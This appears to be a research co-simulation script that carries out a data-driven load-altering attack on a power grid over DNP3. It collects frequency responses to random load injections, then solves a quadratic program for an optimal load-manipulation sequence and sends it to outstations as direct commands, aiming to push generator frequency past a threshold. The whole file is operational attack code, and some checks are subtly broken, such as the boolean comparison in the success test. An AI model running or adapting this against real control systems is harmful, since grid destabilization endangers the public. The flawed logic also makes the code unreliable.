import numpy as np
import logging
import osqp
import time
import threading

from scipy.sparse import csc_matrix

from pydnp3.opendnp3 import GroupVariation

from cosim.mylogging import getLogger
from cosim.dnp3.soe_handler import SOEHandlerAdjusted
from cosim.dnp3.lfc.LFC_master import MasterStation


log = getLogger(__name__, "logs/MDLAA.log")

# System parameters
NOMINAL_PS = np.array([320, 329, 628, 274, 322, 158, 224, 500, 233.8, 522, 247.5, 308.6, 139, 281, 206, 283.5, 7.5, 1104]) # MW
NOMINAL_FREQ = 60   # HZ
num_load_buses = 18 # number of attackable load buses
num_gen_buses = 10  # number of generator buses
Omega_r = 1.025     # Attack success threshold
Ta = 1000           # Historical data length (must be >> Tini + Nap)
Tini = 20           # Initialization window (past steps to match)
Nap = 40            # Prediction horizon (future steps to optimize)
Nac = 30            # Control horizon (steps to apply)
Q = 1e5 * np.eye(num_gen_buses)  # Weight for frequency deviation penalty
R = 1e1 * np.eye(num_load_buses) # Weight for attack effort penalty
max_attack = 0.75 * NOMINAL_PS   # Max x% load alteration per bus
min_attack = -0.25 * NOMINAL_PS  # Min x% load alteration per bus

# --- Initialize Data Storage ---
# Historical attack vectors (inputs) and frequency measurements (outputs)
U = np.zeros([num_load_buses, Ta]) # Input matrix (attack vectors)
Y = np.zeros([num_gen_buses, Ta])  # Output matrix (frequency measurements)


def build_hankel(data, L):
    cols = data.shape[1] - L + 1  # Number of columns in Hankel matrix
    H = np.zeros((L * data.shape[0], cols))
    for i in range(L):
        row_block = data[:, i:i+cols]
        H[i*data.shape[0]:(i+1)*data.shape[0], :] = row_block
    return H


class MDLAASOEHandler(SOEHandlerAdjusted):
    def __init__(self, log_file_path="logs/soehandler.log", soehandler_log_level=logging.INFO, station_ref=None, attacks=np.zeros(num_load_buses), *args, **kwargs):
        super().__init__(log_file_path, soehandler_log_level, station_ref, *args, **kwargs)
        self._num_of_loads_managed_by_master = 10
        
        self._NOMINAL_FREQ = NOMINAL_FREQ
        self._NOMINAL_Ps = NOMINAL_PS
        self._curr_freqs = np.zeros(num_gen_buses)
        self._curr_attack = attacks # Used to apply the attack through the second master station
        self._rnd_attack_strength = 0.01 # pu
        self._curr_attack_temp = np.zeros(num_load_buses)
        
        self._iter = -300 # Adjust for waiting time in sec with no attack at the beginning
        self._attack_to_apply_num = -1
    
        # Initialize data storage for historical attacks and frequencies
        self._U = np.empty([num_load_buses, Ta])
        self._Y = np.empty([num_gen_buses, Ta])
        self._attack_history = np.zeros([num_load_buses, Tini])  # Stores Tini past attacks
        self._freq_history = np.zeros([num_gen_buses, Tini])     # Stores Tini past frequencies   
    
    
    def _process_incoming_data(self, info_gv, visitor_index_and_value):        
        if info_gv in [GroupVariation.Group30Var6]:
            for i in range(num_gen_buses):
                self._curr_freqs[i] = visitor_index_and_value[i][1]
                
            if self._curr_freqs.any() > self._NOMINAL_FREQ * Omega_r:
                log.info("MDLAA SUCCESSFUL! Exiting...")
                exit()
                            
            if self._iter < 0:
                log.info(f"Iter: {self._iter}")
                self._iter += 1
            else:
                if self._iter > Ta:
                    # Update history buffers for frequency (shift left and append new data)
                    self._Y = np.roll(self._Y, -1, axis=1)
                    self._Y[:, -1] = self._curr_freqs 
            
                if self._iter <= Ta:
                    log.info(f"Iter: {self._iter}")
                    # Random attack
                    self._generate_and_apply_random_attack()
                    
                    # Collecting measurements
                    if self._iter >= 0 and self._iter < Ta:
                        self._U[:, self._iter] = self._curr_attack_temp
                        log.debug(f"Attack loads pu: {self._curr_attack_temp.tolist()}")
                        log.debug(f"Loads: {['{0:.4f}'.format(i) for i in self._U[:, self._iter].tolist()]}")    
                    if self._iter > 0:
                        self._Y[:, self._iter-1] = self._curr_freqs
                        log.debug(f"Freqs: {['{0:.5f}'.format(i) for i in self._Y[:, self._iter-1].tolist()]}")  
                    
                    self._iter += 1
                    
                elif self._attack_to_apply_num == -1:
                    log.info("Building Hankels etc.")
                    
                    # Initialize attack and frequency history
                    self._attack_history = self._U[:, :Tini]
                    self._freq_history = self._Y[:, :Tini]  
                    
                    # Construct u_ini and y_ini from Tini past samples
                    u_ini = self._attack_history.flatten(order='F')  # Column-wise flattening
                    y_ini = self._freq_history.flatten(order='F')
                                
                    HU = build_hankel(self._U, Tini + Nap) # Shape: [(Tini+Nap)*num_load_buses, Ta-Tini-Nap+1]
                    HY = build_hankel(self._Y, Tini + Nap) # Shape: [(Tini+Nap)*num_gen_buses, Ta-Tini-Nap+1]

                    # Split into past/future blocks
                    Up = HU[:Tini*num_load_buses, :]
                    Uf = HU[Tini*num_load_buses:(Tini+Nap)*num_load_buses, :]
                    Yp = HY[:Tini*num_gen_buses, :]
                    Yf = HY[Tini*num_gen_buses:(Tini+Nap)*num_gen_buses, :]
                    
                    combined_Hankel = np.vstack([Up, Yp, Uf, Yf])
                    rank = np.linalg.matrix_rank(combined_Hankel)
                    log.info(f"Rank of combined Hankel matrix: {rank} / {combined_Hankel.shape[1]} columns")
                    assert rank == combined_Hankel.shape[1], "Hankel matrix is not full rank"
                    
                    # Construct OSQP problem
                    H = Yf.T @ np.kron(np.eye(Nap), Q) @ Yf + Uf.T @ np.kron(np.eye(Nap), R) @ Uf
                    f = -Yf.T @ np.kron(np.eye(Nap), Q) @ np.tile(Omega_r, (Nap*num_gen_buses, 1))
                    
                    # Equality constraints: [Up; Yp] * g = [u_ini; y_ini]
                    A_eq = np.vstack([Up, Yp])
                    lb_eq = np.hstack([u_ini, y_ini])
                    ub_eq = lb_eq
                    
                    # Check if [u_ini; y_ini] lies in the column space of [Up; Yp]
                    # Solve least-squares: Find g such that A_eq * g ≈ target
                    g_ls = np.linalg.lstsq(A_eq, lb_eq, rcond=None)[0]
                    residual = np.linalg.norm(A_eq @ g_ls - lb_eq)
                    log.info(f"Least-squares residual: {residual}")
                    assert residual <= 1e-6, "Initial conditions incompatible with historical data!"
                    
                    # Inequality constraints: Uf * g <= max_attack (repeated for N steps)
                    A_ineq = Uf
                    ub_ineq = np.tile(max_attack, Nap) # Upper bound - twice the nominal power
                    lb_ineq = np.tile(min_attack, Nap) # Lower bound - half the nominal power
                    
                    # Combine constraints
                    A = np.vstack([A_eq, A_ineq])
                    lb = np.hstack([lb_eq, lb_ineq])
                    ub = np.hstack([ub_eq, ub_ineq])                    
                    
                    # Solve with OSQP
                    log.info("Solving OSQP")
                    prob = osqp.OSQP()    
                    prob.setup(
                        P=csc_matrix(H),
                        q=f.flatten(),
                        A=csc_matrix(A),
                        l=lb,
                        u=ub,
                        #eps_abs=1e-6,
                        #eps_rel=1e-6,
                        verbose=True
                    )
                    OSQP_result = prob.solve() 
                    if OSQP_result.info.status != "solved":
                        log.warning(f"Optimization failed. Status: {OSQP_result.info.status}. Skipping...")
                        # If problem infeasible, apply random attack
                        self._generate_and_apply_random_attack()
                        self._update_attack_history()
                        return
                    
                    log.debug("Extracting optimal attack sequence (first Nac steps)")
                    g_opt = OSQP_result.x
                    u_opt = (Uf @ g_opt).reshape(Nap, num_load_buses)
                    self._optimal_attacks_to_apply = u_opt[:Nac, :]
                    self._attack_to_apply_num += 1
                    
                if self._attack_to_apply_num > -1:
                    self._apply_predicted_attack()
                    self._update_attack_history()
                    self._attack_to_apply_num = -1 if self._attack_to_apply_num == Nac-1 else self._attack_to_apply_num + 1


    def _generate_and_apply_random_attack(self):
        self._curr_attack_temp = np.random.uniform(-self._rnd_attack_strength, self._rnd_attack_strength, num_load_buses) \
                                 * self._NOMINAL_Ps
        for i in range(num_load_buses):
            self._curr_attack[i] = self._curr_attack_temp[i]
        self._do_attack()


    def _apply_predicted_attack(self):
        self._curr_attack_temp = self._optimal_attacks_to_apply[self._attack_to_apply_num, :]
        for i in range(num_load_buses):
            self._curr_attack[i] = self._curr_attack_temp[i]
        log.info(f"Success, attacks: {[float(load) for load in self._curr_attack]}")
        self._do_attack()


    def _do_attack(self):
        loads = []
        for i in range(self._num_of_loads_managed_by_master):
            loads.append(float(self._curr_attack[i]))
            self.station_ref.send_direct_point_command(40, 4, i, loads[i])
        log.info(f"Doing DLAA: {loads}")
                   

    def _update_attack_history(self):
        self._U = np.roll(self._U, -1, axis=1)
        self._U[:, -1] = self._curr_attack_temp


# Secondary master station applying the calculated attacks to second set of loads
class MDLAAHandlerSecondary(SOEHandlerAdjusted):
    def __init__(self, log_file_path="logs/soehandler.log", soehandler_log_level=logging.INFO, station_ref=None, attack=np.zeros(num_load_buses), *args, **kwargs):
        super().__init__(log_file_path, soehandler_log_level, station_ref, *args, **kwargs)
        self._num_of_loads_managed_by_master = 8
        self._NOMINAL_FREQ = NOMINAL_FREQ
        self._NOMINAL_Ps = NOMINAL_PS
        self._curr_attack = attack
        self._prev_attacks = np.zeros(num_load_buses)
        
        
    def _process_incoming_data(self, info_gv, visitor_ind_val):
        if info_gv in [GroupVariation.Group30Var6]:          
            if self._curr_attack.any() != self._prev_attacks.any():
                self._prev_attacks = self._curr_attack.copy()
                self._do_attack()
                
    
    def _do_attack(self):
        loads = []
        for i in range(self._num_of_loads_managed_by_master):
            load_num = num_load_buses - self._num_of_loads_managed_by_master + i
            loads.append(float(self._curr_attack[load_num]))
            self.station_ref.send_direct_point_command(40, 4, i, loads[i])
        log.debug(f"Doing DLAA2: {loads}")


def waiting():
    time.sleep(1_000_000_000)


def main():
    logs_file = "logs/d_r_lfc_mdlaa.log"
    outstation_ip = "172.24.14.212"
    port = 20001
    outstation_ip2 = "172.24.14.213"
    port2 = 20002
    
    scan_time = 100 # ms
    loads_coeffs = np.zeros(num_load_buses)
        
    master = MasterStation(outstation_ip=outstation_ip, port=port, master_id=1, outstation_id=2)
    soe_handler = MDLAASOEHandler(logs_file, station_ref=master, attacks=loads_coeffs)
    master.configure_master(soe_handler, outstation_ip, port, scan_time=scan_time)
    
    master2 = MasterStation(outstation_ip=outstation_ip2, port=port2, master_id=1, outstation_id=2)
    soe_handler2 = MDLAAHandlerSecondary(logs_file, station_ref=master2, attack=loads_coeffs)
    master2.configure_master(soe_handler2, outstation_ip2, port2, scan_time=scan_time)
    
    master.start()
    master2.start()
    
    waiting_thread = threading.Thread(target=waiting, daemon=True)
    waiting_thread.start()
    waiting_thread.join()
    del master
    del master2
    exit()


if __name__ == "__main__":
    main()